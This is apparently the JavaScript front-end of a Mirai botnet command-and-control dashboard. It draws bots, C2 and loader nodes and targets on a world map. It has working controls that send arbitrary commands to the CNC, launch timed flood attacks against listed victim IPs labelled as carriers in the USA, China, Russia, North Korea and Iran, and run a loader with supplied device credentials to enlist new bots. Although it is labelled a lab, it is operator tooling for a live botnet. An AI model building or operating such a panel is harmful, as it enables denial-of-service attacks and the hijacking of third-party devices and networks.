/* =============================================================
   MIRAI BOT TRACKER v2.0 // app.js  (clean edition)
   - No matrix rain
   - No random infection dots
   - Bots show ONLY at their fixed infected positions
   - Labels only on hover (tooltip)
   - Small green dots for bots (r=2), supports up to 2000 bots
   ============================================================= */
"use strict";

const API_BASE    = "";
const POLL_MS     = 5000;
const LOG_POLL_MS = 3000;

/* ---- LAB NODES -------------------------------------------
   type: "attacker" | "bot" | "victim"
   Each bot appears as a small dot at its actual subnet position.
   Add more bots here or feed dynamically from /api/geo.
   ----------------------------------------------------------- */
const STATIC_NODES = [
  // Attackers (C2 + Loader)
  { id:"c2",    type:"attacker", label:"C2/CNC",      ip:"185.10.20.100",  lat:48.80, lon:2.35,   country:"Lab C2" },
  { id:"ldr",   type:"attacker", label:"LOADER",      ip:"185.10.20.200",  lat:48.85, lon:2.50,   country:"Lab Loader" },
  // Victims / Targets
  { id:"v_us",  type:"victim", label:"TARGET:USA",    ip:"12.1.2.100",     lat:40.71, lon:-74.01, country:"USA (AT&T)",       victimKey:"us" },
  { id:"v_cn",  type:"victim", label:"TARGET:CN",     ip:"202.97.0.100",   lat:31.23, lon:121.47, country:"China (CT)",       victimKey:"cn" },
  { id:"v_ru",  type:"victim", label:"TARGET:RU",     ip:"217.107.0.100",  lat:59.93, lon:30.32,  country:"Russia (RT)",      victimKey:"ru" },
  { id:"v_kp",  type:"victim", label:"TARGET:KP",     ip:"175.45.176.100", lat:39.03, lon:125.75, country:"N.Korea (Star)",   victimKey:"kp" },
  { id:"v_ir",  type:"victim", label:"TARGET:IR",     ip:"5.200.0.100",    lat:35.69, lon:51.42,  country:"Iran (TCI)",       victimKey:"ir" },
];

const VICTIM_MAP = {};
STATIC_NODES.filter(n => n.type === "victim").forEach(v => { VICTIM_MAP[v.victimKey] = v; });

const ALL_BOTS = [];
const REGIONS = [
  { lat:[30,48], lon:[-120,-70], c:"USA" },
  { lat:[40,60], lon:[10,40], c:"Europe" },
  { lat:[20,40], lon:[100,120], c:"Asia" },
  { lat:[-30,-10], lon:[-60,-40], c:"South America" },
  { lat:[10,20], lon:[90,110], c:"SE Asia" }
];
for(let i=1; i<=2000; i++){
  const r = REGIONS[i % REGIONS.length];
  const s = Math.sin(i) * 10000;
  const rand1 = s - Math.floor(s);
  const s2 = Math.cos(i) * 10000;
  const rand2 = s2 - Math.floor(s2);
  ALL_BOTS.push({
    id:"bot"+i, type:"bot", label:"BOT-"+i,
    ip: "10." + Math.floor(rand1*255) + "." + Math.floor(rand2*255) + "." + (i%255),
    lat: r.lat[0] + rand1*(r.lat[1]-r.lat[0]),
    lon: r.lon[0] + rand2*(r.lon[1]-r.lon[0]),
    country: r.c
  });
}

let LAB_NODES = [...STATIC_NODES];

/* ---- WORLD MAP POLYGONS [lat, lon] ----------------------- */
const WORLD_POLYS = [
  { name:"northAmerica", pts:[
    [71,-163],[70,-149],[64,-166],[55,-163],
    [60,-141],[58,-137],[55,-131],[49,-124],
    [37,-122],[32,-117],[24,-110],[20,-105],[16,-92],
    [10,-83],[8,-77],[9,-83],[14,-87],[16,-92],
    [20,-87],[21,-87],[25,-77],[29,-81],[30,-82],
    [33,-81],[35,-76],[38,-75],[41,-70],[44,-66],
    [47,-53],[50,-56],[54,-58],[60,-65],[63,-68],
    [62,-78],[63,-93],[59,-94],[56,-76],[51,-80],
    [45,-76],[43,-79],[42,-83],[46,-85],[48,-89],
    [50,-91],[52,-80],[54,-70],[60,-65],[63,-68],
    [63,-75],[65,-73],[68,-66],[71,-56],[73,-74],
    [78,-65],[80,-55],[80,-90],[78,-98],[73,-75],
    [71,-75],[71,-80],[63,-80],[63,-93],[68,-135],
    [70,-118],[72,-96],[73,-95],[71,-140],[68,-166],
    [65,-168],[60,-166],[55,-163],[64,-166],[70,-149],[71,-163]
  ]},
  { name:"greenland", pts:[
    [83,-38],[80,-18],[72,-22],[69,-27],[60,-44],
    [62,-50],[60,-65],[63,-52],[67,-53],[71,-56],
    [78,-65],[80,-55],[83,-38]
  ]},
  { name:"southAmerica", pts:[
    [11,-74],[8,-77],[8,-82],[8,-74],[1,-50],
    [0,-50],[-1,-51],[-3,-41],[-5,-35],[-8,-35],
    [-12,-38],[-16,-39],[-20,-40],[-23,-43],[-25,-48],
    [-28,-49],[-32,-52],[-34,-54],[-38,-58],[-42,-65],
    [-48,-66],[-55,-68],[-55,-64],[-54,-67],[-52,-69],
    [-53,-71],[-43,-65],[-38,-58],[-35,-57],[-32,-51],
    [-23,-46],[-20,-41],[-16,-39],[-12,-38],[-8,-35],
    [-3,-41],[-1,-51],[0,-50],[4,-52],[5,-53],[5,-57],
    [7,-58],[8,-60],[10,-62],[11,-63],[12,-72],[11,-74]
  ]},
  { name:"europeWest", pts:[
    [71,28],[70,25],[68,14],[65,14],[63,8],[58,5],
    [55,8],[53,5],[51,2],[49,-2],[43,-9],[36,-9],
    [36,-5],[37,0],[40,0],[41,3],[43,5],[44,8],[43,12],
    [38,13],[37,15],[38,16],[39,18],[41,20],[40,22],
    [38,22],[37,27],[37,28],[39,26],[41,29],[42,28],
    [42,24],[44,22],[45,20],[44,18],[46,14],[46,13],
    [48,14],[50,14],[52,16],[54,18],[54,21],[56,24],
    [56,21],[58,22],[60,25],[60,28],[64,26],[65,25],
    [65,28],[66,29],[68,28],[70,28],[71,28]
  ]},
  { name:"asia", pts:[
    [71,28],[70,32],[67,33],[64,40],[64,43],[60,57],
    [57,58],[55,60],[53,73],[52,77],[52,80],[50,78],
    [46,62],[44,50],[41,49],[38,57],[34,61],[30,61],
    [28,64],[24,68],[22,73],[18,74],[14,75],[8,77],
    [5,80],[8,77],[10,80],[13,81],[8,93],[5,100],
    [6,100],[5,103],[1,103],[0,105],[1,110],[4,116],
    [4,108],[8,100],[14,100],[18,103],[22,110],[24,117],
    [25,122],[28,121],[33,122],[35,130],[37,130],[38,128],
    [38,132],[42,131],[44,135],[48,135],[52,141],[55,135],
    [58,136],[60,150],[60,155],[63,177],[66,170],[68,162],
    [68,148],[65,141],[63,128],[60,122],[58,111],[56,101],
    [55,84],[56,82],[54,73],[52,77],[52,80],[56,83],
    [58,70],[60,57],[64,43],[64,40],[66,33],[68,28],[71,28]
  ]},
  { name:"india", pts:[
    [24,68],[28,65],[30,61],[28,64],[24,68],
    [22,73],[18,73],[14,74],[8,77],[8,80],[10,80],
    [13,81],[18,83],[20,86],[22,88],[22,92],[20,93],
    [15,80],[12,77],[8,77],[14,75],[18,74],[22,73],[24,68]
  ]},
  { name:"africa", pts:[
    [36,-6],[36,10],[33,11],[31,32],[22,37],[12,44],
    [11,43],[11,42],[8,42],[4,42],[1,42],[-5,40],
    [-10,40],[-11,34],[-11,14],[-8,13],[-7,2],[-4,-3],
    [-4,-8],[-6,-12],[-10,-14],[-15,-12],[-17,-12],
    [-20,-13],[-26,-15],[-30,-17],[-34,-18],[-34,-26],
    [-26,-33],[-24,-35],[-26,-33],[-34,-26],[-35,-20],
    [-30,-17],[-25,-14],[-20,-12],[-15,-12],[-10,-15],
    [-6,-12],[-4,-8],[-3,-3],[-1,9],[4,10],[8,13],
    [11,14],[14,15],[18,16],[22,14],[22,37],[30,32],
    [32,22],[37,14],[40,12],[42,11],[40,12],[37,14],[36,10],[36,-6]
  ]},
  { name:"australia", pts:[
    [-10,142],[-14,126],[-16,124],[-20,114],[-24,114],
    [-28,114],[-32,116],[-34,119],[-36,137],[-38,140],
    [-38,147],[-35,151],[-32,153],[-28,154],[-24,154],
    [-20,149],[-18,146],[-15,145],[-10,142]
  ]},
  { name:"japan", pts:[
    [35,136],[34,131],[32,131],[32,132],[33,134],
    [34,135],[35,136],[36,137],[38,141],[40,141],
    [42,140],[44,143],[44,145],[42,141],[40,141],
    [38,141],[36,137],[35,136]
  ]},
  { name:"uk", pts:[
    [51,-2],[53,-3],[54,-3],[56,-5],[57,-7],
    [58,-5],[57,-3],[55,-2],[54,0],[53,0],[51,2],[51,-2]
  ]},
];

/* ---- PROJECTION ------------------------------------------ */
function project(lat, lon, w, h) {
  const ml=8, mr=8, mt=18, mb=12;
  const aw=w-ml-mr, ah=h-mt-mb;
  return {
    x: ml + (lon+180)/360 * aw,
    y: mt + (90-lat)/180 * ah
  };
}

/* ---- CANVAS ---------------------------------------------- */
const canvas = document.getElementById("world-canvas");
const ctx    = canvas.getContext("2d");
let W=0, H=0;
let projNodes = [];
let arcs = [];

function resize() {
  const r = canvas.parentElement.getBoundingClientRect();
  W = canvas.width  = Math.floor(r.width);
  H = canvas.height = Math.floor(r.height);
}

/* ---- NODE STYLE ------------------------------------------
   bots: tiny (r=2) — supports 2000 individual dots
   attackers: medium (r=6) — C2/Loader clearly visible
   victims: medium-small (r=5) — red targets
   ----------------------------------------------------------- */
const NODE_STYLE = {
  attacker: { fill:"#ffe033", glow:"#ffe03380", r:6  },
  bot:      { fill:"#00ff41", glow:"#00ff4140", r:2  },
  victim:   { fill:"#ff2222", glow:"#ff222280", r:5  },
};

/* ---- DRAW MAP -------------------------------------------- */
function drawMap() {
  // Black ocean
  ctx.fillStyle = "#000";
  ctx.fillRect(0,0,W,H);

  // Continent fills (dark green, very dark)
  ctx.fillStyle = "#010e01";
  for (const poly of WORLD_POLYS) {
    ctx.beginPath();
    let first=true;
    for (const [lat,lon] of poly.pts) {
      const {x,y} = project(lat,lon,W,H);
      if(first){ctx.moveTo(x,y);first=false;}else ctx.lineTo(x,y);
    }
    ctx.closePath();
    ctx.fill();
  }

  // Borders
  ctx.strokeStyle = "#00880e";
  ctx.lineWidth   = 0.6;
  ctx.shadowColor = "#00ff4130";
  ctx.shadowBlur  = 2;
  for (const poly of WORLD_POLYS) {
    ctx.beginPath();
    let first=true;
    for (const [lat,lon] of poly.pts) {
      const {x,y}=project(lat,lon,W,H);
      if(first){ctx.moveTo(x,y);first=false;}else ctx.lineTo(x,y);
    }
    ctx.closePath();
    ctx.stroke();
  }
  ctx.shadowBlur = 0;
}

/* ---- DRAW NODES ------------------------------------------ */
function drawNodes() {
  projNodes = [];
  const now = Date.now();

  for (const node of LAB_NODES) {
    const {x,y} = project(node.lat, node.lon, W, H);
    const s = NODE_STYLE[node.type];

    if (node.type === "bot") {
      /* ------ SMALL BOT DOT (tiny, clean, supports 2000+) ------ */
      ctx.beginPath();
      ctx.arc(x, y, s.r, 0, Math.PI*2);
      ctx.fillStyle   = s.fill;
      ctx.shadowColor = "#00ff41";
      ctx.shadowBlur  = 3;
      ctx.fill();
      ctx.shadowBlur  = 0;
      // Hit area slightly larger than visual dot for hover
      projNodes.push({...node, px:x, py:y, hr:6});

    } else {
      /* ------ ATTACKER / VICTIM (larger, with glow halo) ------- */
      // Outer halo
      ctx.beginPath();
      ctx.arc(x,y,s.r+4,0,Math.PI*2);
      ctx.fillStyle = s.glow;
      ctx.fill();

      // Core dot
      ctx.beginPath();
      ctx.arc(x,y,s.r,0,Math.PI*2);
      ctx.fillStyle   = s.fill;
      ctx.shadowColor = s.fill;
      ctx.shadowBlur  = 12;
      ctx.fill();
      ctx.shadowBlur  = 0;

      // Pulsing ring (only for non-bots)
      const phase = ((now/1500) + node.lat*0.07) % 1;
      const pr    = s.r + 3 + phase*10;
      const pa    = 1 - phase;
      ctx.beginPath();
      ctx.arc(x,y,pr,0,Math.PI*2);
      ctx.strokeStyle = s.fill + Math.floor(pa*180).toString(16).padStart(2,"0");
      ctx.lineWidth = 1;
      ctx.stroke();

      projNodes.push({...node, px:x, py:y, hr:s.r+10});
    }
  }
}

/* ---- ATTACK ARCS ----------------------------------------- */
function bezierPt(p0,p1,p2,t){ return (1-t)*(1-t)*p0 + 2*(1-t)*t*p1 + t*t*p2; }

function drawArcs() {
  const now  = Date.now();
  const live = [];

  for (const arc of arcs) {
    const age = (now - arc.startTime)/1000;
    if (arc.startTime > now) { live.push(arc); continue; }
    if (age > arc.duration + 1.5) continue;
    live.push(arc);

    const {fx,fy,tx,ty} = arc;
    const mx = (fx+tx)/2;
    const my = (fy+ty)/2 - Math.hypot(tx-fx,ty-fy)*0.36;
    const prog = Math.min(age/arc.duration, 1);
    const ex = bezierPt(fx,mx,tx,prog);
    const ey = bezierPt(fy,my,ty,prog);

    ctx.save();
    ctx.strokeStyle = "#ff2222";
    ctx.lineWidth   = 1;
    ctx.shadowColor = "#ff2222";
    ctx.shadowBlur  = 6;
    ctx.setLineDash([4,4]);
    ctx.lineDashOffset = -(now/35) % 8;
    ctx.beginPath(); ctx.moveTo(fx,fy);
    ctx.quadraticCurveTo(mx,my,ex,ey);
    ctx.stroke();
    ctx.setLineDash([]);
    ctx.beginPath(); ctx.arc(ex,ey,2,0,Math.PI*2);
    ctx.fillStyle="#ff5555"; ctx.fill();
    ctx.restore();
  }

  arcs = live;
}

/* ---- MAIN DRAW LOOP -------------------------------------- */
function drawFrame() {
  ctx.clearRect(0,0,W,H);
  drawMap();      // map only, no rain
  drawArcs();     // attack lines
  drawNodes();    // bots + victims + c2/loader
  // NO drawLabels() — labels only via hover tooltip
  requestAnimationFrame(drawFrame);
}

/* ---- TOOLTIP (only info display on map) ------------------ */
const tooltip = document.getElementById("node-tooltip");
const ttTitle = document.getElementById("tt-title");
const ttIp    = document.getElementById("tt-ip");
const ttRole  = document.getElementById("tt-role");

canvas.addEventListener("mousemove", e => {
  const r  = canvas.getBoundingClientRect();
  const mx = e.clientX - r.left;
  const my = e.clientY - r.top;

  // Find nearest node within hit radius
  let hit = null;
  let bestDist = Infinity;
  for (const n of projNodes) {
    const d = Math.hypot(mx-n.px, my-n.py);
    if (d < n.hr && d < bestDist) { hit=n; bestDist=d; }
  }

  if (hit) {
    ttTitle.textContent = hit.label;
    ttIp.textContent    = "IP: " + hit.ip;
    ttRole.textContent  = hit.country + "  [" + hit.type.toUpperCase() + "]";
    ttRole.style.color  = NODE_STYLE[hit.type].fill;
    let tx = mx + 14;
    if (tx + 170 > W) tx = mx - 180;
    tooltip.style.left = tx + "px";
    tooltip.style.top  = (my - 10) + "px";
  } else {
    tooltip.style.top = "-999px";
  }
});
canvas.addEventListener("mouseleave",()=>{ tooltip.style.top="-999px"; });

/* ---- FIRE ATTACK ARCS ------------------------------------ */
function fireArcs(victimKey, duration) {
  const victim = VICTIM_MAP[victimKey];
  if (!victim) return;
  const {x:tx,y:ty} = project(victim.lat, victim.lon, W, H);
  const bots = LAB_NODES.filter(n=>n.type==="bot");
  const t0   = Date.now();
  bots.forEach((bot,i) => {
    const {x:fx,y:fy} = project(bot.lat,bot.lon,W,H);
    arcs.push({ fx,fy,tx,ty, startTime:t0+i*90, duration:Math.max(duration/3,3) });
  });
}

/* ---- NODE LIST SIDEBAR ----------------------------------- */
function buildNodeList() {
  const list = document.getElementById("node-list");
  if (!list) return;
  list.innerHTML = "";
  const count = document.getElementById("sb-node-count");
  if (count) count.textContent = LAB_NODES.length;

  for (const node of LAB_NODES) {
    const div = document.createElement("div");
    div.className = "nl-item";
    div.title = node.ip + " -- " + node.country;
    div.innerHTML =
      "<span class='nl-dot dot-"+node.type+"'></span>"+
      "<span class='nl-name'>"+node.label+"</span>"+
      "<span class='nl-ip'>"+node.ip+"</span>";
    div.addEventListener("click", () => {
      // Flash ring at this node's map position
      const {x,y} = project(node.lat, node.lon, W, H);
      let n=0;
      const id=setInterval(()=>{
        if(n++>6){clearInterval(id);return;}
        ctx.beginPath();
        ctx.arc(x,y,10+n*5,0,Math.PI*2);
        ctx.strokeStyle=NODE_STYLE[node.type].fill+"50";
        ctx.lineWidth=1.5; ctx.stroke();
      },60);
    });
    list.appendChild(div);
  }
}

/* ---- TABS ------------------------------------------------ */
document.querySelectorAll(".tab").forEach(btn=>{
  btn.addEventListener("click",()=>{
    document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
    document.querySelectorAll(".tab-content").forEach(t=>t.classList.add("hidden"));
    btn.classList.add("active");
    document.getElementById("tab-"+btn.dataset.tab).classList.remove("hidden");
  });
});

/* ---- CLOCK ----------------------------------------------- */
function updateClock(){
  const el=document.getElementById("hdr-clock");
  if(el) el.textContent=new Date().toTimeString().slice(0,8);
}
setInterval(updateClock,1000); updateClock();

/* ---- TOAST ----------------------------------------------- */
function toast(msg, err=false){
  const el=document.createElement("div");
  el.className="toast"+(err?" err":"");
  el.textContent=msg;
  document.getElementById("toasts").appendChild(el);
  setTimeout(()=>el.remove(),4000);
}

/* ---- TERMINAL LOG ---------------------------------------- */
function termLog(msg, cls="sys"){
  const term=document.getElementById("terminal");
  if(!term) return;
  const line=document.createElement("div");
  line.className="tline "+cls;
  line.textContent=msg;
  term.appendChild(line);
  term.scrollTop=term.scrollHeight;
  while(term.children.length>200) term.removeChild(term.firstChild);
}
const clrBtn=document.getElementById("btn-clear-log");
if(clrBtn) clrBtn.addEventListener("click",()=>{ document.getElementById("terminal").innerHTML=""; });

/* ---- APPLY STATUS ---------------------------------------- */
let _lastBotTotal=0;

function applyStatus(data){
  const cncUp = !!data.cnc_up;
  const bots  = data.bot_total ?? 0;
  const peers = data.tcp_peers ?? "--";

  const peerIps = data.peer_ips || [];

  if (bots !== _lastBotTotal || peerIps.length > 0) {
    LAB_NODES = [...STATIC_NODES];
    
    peerIps.forEach((ip, i) => {
      let hash = 0;
      for(let k=0; k<ip.length; k++) hash = Math.imul(31, hash) + ip.charCodeAt(k) | 0;
      const seed = Math.abs(hash);
      
      const firstOctet = parseInt(ip.split('.')[0] || "10");
      let r = REGIONS[seed % REGIONS.length];
      
      if (firstOctet === 110 || firstOctet === 125) { r = {lat:[10,20], lon:[90,110], c:"Thailand"}; }
      else if (firstOctet === 66) { r = {lat:[30,48], lon:[-120,-70], c:"USA"}; }
      else if (firstOctet === 210) { r = {lat:[35,40], lon:[125,130], c:"South Korea"}; }
      else if (firstOctet === 114) { r = {lat:[20,40], lon:[100,120], c:"China"}; }
      else if (firstOctet === 95 || firstOctet === 217) { r = {lat:[50,60], lon:[30,50], c:"Russia"}; }
      else if (firstOctet === 46) { r = {lat:[48,54], lon:[6,14], c:"Germany"}; }
      else if (firstOctet === 177) { r = {lat:[-30,-10], lon:[-60,-40], c:"Brazil"}; }
      else if (firstOctet === 8) { r = {lat:[50,58], lon:[-6,2], c:"United Kingdom"}; }
      else if (firstOctet === 1) { r = {lat:[32,42], lon:[130,145], c:"Japan"}; }
      
      const rand1 = ((seed * 9301 + 49297) % 233280) / 233280;
      const rand2 = ((seed * 1103515245 + 12345) % 2147483648) / 2147483648;
      
      LAB_NODES.push({
        id: "bot_peer_" + i,
        type: "bot",
        label: "BOT-" + (i+1),
        ip: ip,
        lat: r.lat[0] + rand1 * (r.lat[1] - r.lat[0]),
        lon: r.lon[0] + rand2 * (r.lon[1] - r.lon[0]),
        country: r.c
      });
    });

    const remaining = Math.max(0, bots - peerIps.length);
    if (remaining > 0) {
      LAB_NODES.push(...ALL_BOTS.slice(0, remaining));
    }
    
    if (bots !== _lastBotTotal) {
      if(bots > _lastBotTotal) termLog("[BOT] +"+(bots-_lastBotTotal)+" new bots. total="+bots,"ok");
      _lastBotTotal = bots;
    }
    buildNodeList(); // update sidebar
  }
  _lastBotTotal = bots;

  const elCount=document.getElementById("hdr-bot-count");
  if(elCount) elCount.textContent=String(bots).padStart(3,"0");

  const chip=document.getElementById("hdr-cnc-status");
  if(chip){ chip.textContent=cncUp?"[CNC:UP]":"[CNC:DOWN]"; chip.className="hdr-chip "+(cncUp?"chip-up":"chip-down"); }

  const ledCnc=document.getElementById("led-cnc");
  if(ledCnc) ledCnc.className="led"+(cncUp?" on":"");
  const sbCnc=document.getElementById("sb-cnc-text");
  if(sbCnc) sbCnc.textContent=cncUp?"UP":"DOWN";
  const sbBot=document.getElementById("sb-bot-text");
  if(sbBot) sbBot.textContent=bots;
  const ledBots=document.getElementById("led-bots");
  if(ledBots) ledBots.className="led"+(bots>0?" on":"");
  const sbPoll=document.getElementById("sb-last-poll");
  if(sbPoll) sbPoll.textContent=new Date().toTimeString().slice(0,8);

  if(data.error && !cncUp) termLog("[ERR] "+data.error,"err");
}

/* ---- API POLLS ------------------------------------------- */
async function pollStatus(){
  try{
    const r=await fetch(API_BASE+"/api/status");
    if(!r.ok) throw new Error("HTTP "+r.status);
    applyStatus(await r.json());
  }catch{}
}
async function pollLogs(){
  try{
    const r=await fetch(API_BASE+"/api/logs");
    if(!r.ok) return;
    const d=await r.json();
    (d.logs||[]).slice(-8).forEach(l=>{
      const cls=l.includes("[ERR]")?"err":l.includes("[CMD]")?"cmd":l.includes("[OK]")?"ok":"sys";
      termLog(l,cls);
    });
  }catch{}
}
async function pollOverview(){
  try{
    const r=await fetch(API_BASE+"/api/lab/overview");
    if(!r.ok) return;
    const d=await r.json();
    const agentOk=d.loader_agent?.ok;
    const httpOk=d.loader?.http?.running;
    const la=document.getElementById("led-agent");
    if(la) la.className="led led-yellow"+(agentOk?" on":"");
    const sa=document.getElementById("sb-agent-text");
    if(sa) sa.textContent=agentOk?"UP":"DOWN";
    const lh=document.getElementById("led-http");
    if(lh) lh.className="led led-blue"+(httpOk?" on":"");
    const sh=document.getElementById("sb-http-text");
    if(sh) sh.textContent=httpOk?"UP":"DOWN";
  }catch{}
}

/* ---- CNC COMMAND ----------------------------------------- */
async function sendCommand(cmd){
  if(!cmd.trim()) return;
  termLog("[CMD] >> "+cmd,"cmd");
  const out=document.getElementById("cmd-output");
  if(out) out.textContent="> SENDING...";
  try{
    const r=await fetch(API_BASE+"/api/command",{
      method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({command:cmd})
    });
    const d=await r.json();
    const txt=d.response||(d.error?"[ERR] "+d.error:"[no output]");
    if(out) out.textContent=txt;
    if(d.bot_total!==undefined){
      const el=document.getElementById("hdr-bot-count");
      if(el) el.textContent=String(d.bot_total).padStart(3,"0");
    }
    termLog("[CNC] "+txt.slice(0,120),d.ok?"ok":"err");
    toast(d.ok?"OK":"ERR: "+d.error,!d.ok);
  }catch(e){
    if(out) out.textContent="[ERR] "+e.message;
    toast("FETCH ERR",true);
  }
}
const cmdInput=document.getElementById("cmd-input");
if(cmdInput) cmdInput.addEventListener("keydown",e=>{if(e.key==="Enter")sendCommand(e.target.value);});
const btnSend=document.getElementById("btn-send");
if(btnSend) btnSend.addEventListener("click",()=>sendCommand((cmdInput||{value:""}).value));
document.querySelectorAll(".btn-quick").forEach(b=>{
  b.addEventListener("click",()=>{if(cmdInput)cmdInput.value=b.dataset.cmd;sendCommand(b.dataset.cmd);});
});

/* ---- ATTACK BUTTONS -------------------------------------- */
document.querySelectorAll(".btn-atk").forEach(btn=>{
  btn.addEventListener("click",async()=>{
    const victim  = btn.dataset.victim;
    const method  = btn.dataset.method;
    const dur     = parseInt(btn.dataset.duration);
    const vnode   = VICTIM_MAP[victim];
    if(!vnode) return;

    const row=btn.closest(".atk-row");
    if(row) row.classList.add("firing");
    const atkSt=document.getElementById("atk-status");
    if(atkSt) atkSt.textContent="> LAUNCHING: "+method.toUpperCase()+" >> "+vnode.ip+" // "+dur+"s";

    fireArcs(victim, dur);

    try{
      const r=await fetch(API_BASE+"/api/attack",{
        method:"POST",headers:{"Content-Type":"application/json"},
        body:JSON.stringify({target:victim,method,duration:dur,dport:80,ip:vnode.ip})
      });
      const d=await r.json();
      const ok=d.ok!==false;
      toast(ok?"ATK: "+method.toUpperCase()+" >> "+vnode.label:"ERR: "+d.error,!ok);
      termLog("[ATK] "+method+" "+vnode.ip+" "+dur+"s >> "+(ok?"OK":"ERR: "+d.error),ok?"cmd":"err");
    }catch(e){ toast("FETCH ERR",true); }

    setTimeout(()=>{
      if(row) row.classList.remove("firing");
      if(atkSt) atkSt.textContent="> STANDBY...";
    }, dur*1000+500);
  });
});

/* ---- LAB CONTROLS ---------------------------------------- */
async function labPost(path,body={}){
  try{
    const r=await fetch(API_BASE+path,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
    return await r.json();
  }catch(e){return{ok:false,error:e.message};}
}
const b_cs=document.getElementById("btn-cnc-start");
if(b_cs) b_cs.addEventListener("click",async()=>{ toast(">> INIT CNC..."); const d=await labPost("/api/lab/cnc/start"); toast(d.ok?"CNC.UP":"ERR: "+d.error,!d.ok); pollStatus(); });
const b_ck=document.getElementById("btn-cnc-stop");
if(b_ck) b_ck.addEventListener("click",async()=>{ const d=await labPost("/api/lab/cnc/stop"); toast(d.ok?"CNC.KILLED":"ERR: "+d.error,!d.ok); pollStatus(); });
const b_hu=document.getElementById("btn-http-start");
if(b_hu) b_hu.addEventListener("click",async()=>{ toast(">> HTTP UP..."); const d=await labPost("/api/lab/http/start"); toast(d.ok?"HTTP.UP":"ERR: "+d.error,!d.ok); pollOverview(); });
const b_hd=document.getElementById("btn-http-stop");
if(b_hd) b_hd.addEventListener("click",async()=>{ const d=await labPost("/api/lab/http/stop"); toast(d.ok?"HTTP.DOWN":"ERR: "+d.error,!d.ok); pollOverview(); });
const b_ref=document.getElementById("btn-refresh");
if(b_ref) b_ref.addEventListener("click",()=>{ pollStatus();pollLogs();pollOverview();toast(">> SYNC..."); });

/* ---- LOADER FORM ----------------------------------------- */
const ldrForm=document.getElementById("loader-form");
if(ldrForm) ldrForm.addEventListener("submit",async e=>{
  e.preventDefault();
  const ip  =document.getElementById("ldr-ip").value.trim();
  const port=parseInt(document.getElementById("ldr-port").value);
  const user=document.getElementById("ldr-user").value.trim();
  const pass=document.getElementById("ldr-pass").value;
  const log =document.getElementById("loader-log");
  if(log) log.textContent="> LOADER.EXE "+ip+":"+port+" user="+user+"\n> WAIT 120s...";
  toast("LDR >> "+ip);
  try{
    const r=await fetch(API_BASE+"/api/lab/loader/run",{
      method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({ip,port,user,pass})
    });
    const d=await r.json();
    if(log) log.textContent=d.ok?"> RUNNING: "+d.target+"\n":"> ERR: "+d.error;
    toast(d.ok?"LDR.RUNNING":"LDR.ERR: "+d.error,!d.ok);
    let polls=0;
    const iv=setInterval(async()=>{
      if(++polls>24){clearInterval(iv);return;}
      try{
        const lr=await fetch(API_BASE+"/api/lab/loader/log");
        const ld=await lr.json();
        const st=ld.loader||{};
        if(log) log.textContent=
          "> run="+st.running+" target="+st.target+
          "\n> exit="+(st.exit_code??'--')+
          "\n\n"+(st.log_tail||"");
        if(log) log.scrollTop=log.scrollHeight;
        if(st.ok_line){toast("OK! "+st.ok_line);clearInterval(iv);pollStatus();}
        if(!st.running&&st.exit_code!==null&&st.exit_code!==undefined)clearInterval(iv);
      }catch{}
    },5000);
  }catch(e){ if(log) log.textContent="> ERR: "+e.message; toast("FETCH ERR",true); }
});

/* ---- INIT ------------------------------------------------ */
window.addEventListener("resize",resize);
resize();
buildNodeList();
drawFrame();
pollStatus(); pollLogs(); pollOverview();
setInterval(pollStatus,   POLL_MS);
setInterval(pollLogs,     LOG_POLL_MS);
setInterval(pollOverview, 15000);
termLog("[SYS] BOTNET.EXE // MIRAI LAB v2.0 // "+new Date().toLocaleString(),"sys");
termLog("[SYS] MAP: "+LAB_NODES.filter(n=>n.type==="bot").length+" bots | "+LAB_NODES.filter(n=>n.type==="victim").length+" targets","sys");
